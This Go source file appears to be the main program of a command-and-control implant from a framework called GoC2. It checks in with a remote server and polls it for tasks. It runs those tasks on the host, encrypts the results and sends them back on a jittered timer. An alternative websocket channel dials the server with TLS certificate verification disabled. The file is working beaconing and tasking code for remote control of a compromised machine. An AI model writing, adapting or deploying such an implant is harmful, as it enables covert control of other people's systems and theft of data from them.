package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"

	"github.com/gorilla/websocket"
	"github.com/latortuga71/GoC2/internal/client"
	"github.com/latortuga71/GoC2/internal/data"
)

func httpsMode() {
	err := client.InitializeClient()
	if err != nil {
		log.Fatal("Failed to initialize client.")
	}
	httpsUrl := fmt.Sprintf("https://%s:%s", client.ServerHostName, client.ServerPort)
	checkInUrl := fmt.Sprintf("%s/login", httpsUrl)
	taskUrl := fmt.Sprintf("%s/tasks", httpsUrl)
	resultsUrl := fmt.Sprintf("%s/results", httpsUrl)
	err = client.ClientDoCheckInHttps(client.Client, checkInUrl)
	if err != nil {
		log.Fatal(err)
	}
	go func() {
		// were checked in and now we can poll for tasks
		for {

			t, err := client.ClientHttpsPollHandler(client.Client, taskUrl)
			if err != nil {
				client.ClientInterrupt <- os.Interrupt
				break
			}
			log.Println(t)
			if len(t) == 0 {
				time.Sleep(time.Second * time.Duration(client.Client.Jitter))
				continue
			}
			// do all tasks in order
			results := make([]data.Message, 0)
			for x := 0; x < len(t); x++ {
				msg := data.Message{
					MessageType: "Task",
					MessageData: t[x].ToBytes(),
				}
				err, result := client.ClientHandleTask(msg.ToBytes())
				if err != nil {
					client.ClientInterrupt <- os.Interrupt
					break
				}
				log.Println(result)
				// encrypt marshaled task result.
				encryptedTaskResult, err := client.Client.EncryptMessageWithPubKey(result.ToBytes())
				if err != nil {
					client.ClientInterrupt <- os.Interrupt
					break
				}
				log.Println(encryptedTaskResult)
				d := data.Message{
					MessageType: "TaskResult",
					MessageData: encryptedTaskResult,
				}
				results = append(results, d)
			}
			err = client.ClientHttpsSendResultsHandler(client.Client, resultsUrl, results)
			if err != nil {
				client.ClientInterrupt <- os.Interrupt
				break
			}
			time.Sleep(time.Second * time.Duration(client.Client.Jitter))
		}
	}()
	for {
		select {
		case <-client.ClientInterrupt:
			log.Println("Received SIGINT interrupt signal. Closing all pending connections")
			close(client.ClientDone)
			select {
			case <-client.ClientDone:
				log.Println("Receiver Channel Closed! Exiting....")
			case <-time.After(time.Duration(1) * time.Second):
				log.Println("Timeout in closing receiving channel. Exiting....")
			}
			return
		}
	}
}

func websocketMode() {
	err := client.InitializeClient()
	if err != nil {
		log.Fatal("Failed to initialize client.")
	}
	socketUrl := fmt.Sprintf("wss://%s:%s/socketClient", client.ServerHostName, client.ServerPort)
	websocket.DefaultDialer.TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true,
		//RootCAs:            client.Client.ClientCaCertPool,
		//Certificates:       []tls.Certificate{client.Client.ClientTLSCertificate},
	}
	c, _, err := websocket.DefaultDialer.Dial(socketUrl, http.Header{
		"shared-secret": []string{client.ServerSecret},
	})
	client.Client.WSConn = data.NewConnection(c)
	if err != nil {
		log.Fatal("Error connecting to Websocket Server: ", err)
	}
	go client.ClientReceiveHandler(client.Client)
	client.ClientDoCheckIn(client.Client)
	for {
		select {
		case <-client.ClientInterrupt:
			log.Println("Received SIGINT interrupt signal. Closing all pending connections")
			err := client.Client.WSConn.WriteMessage(websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			if err != nil {
				log.Println("Error during closing websocket:", err)
			}
			close(client.ClientDone)
			select {
			case <-client.ClientDone:
				log.Println("Receiver Channel Closed! Exiting....")
			case <-time.After(time.Duration(1) * time.Second):
				log.Println("Timeout in closing receiving channel. Exiting....")
			}
			return
		}
	}
}

func main() {
	//websocketMode()
	httpsMode()
}
